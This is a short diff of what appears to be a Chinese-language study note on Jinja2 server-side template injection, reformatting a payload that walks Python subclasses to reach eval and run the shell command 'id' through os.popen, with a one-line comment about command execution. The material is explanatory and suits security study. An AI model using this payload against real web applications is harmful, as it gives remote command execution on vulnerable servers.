@@ -29,8 +29,13 @@ if __name__ == "__main__":
 
 ```
 # 命令执行
-{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}
+{% for c in [].__class__.__base__.__subclasses__() %}
+	{% if c.__name__=='catch_warnings' %}
+		{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}
+	{% endif %}
+{% endfor %}
 ```
+首先这个调用了一个命令执行的函数
 
 
 
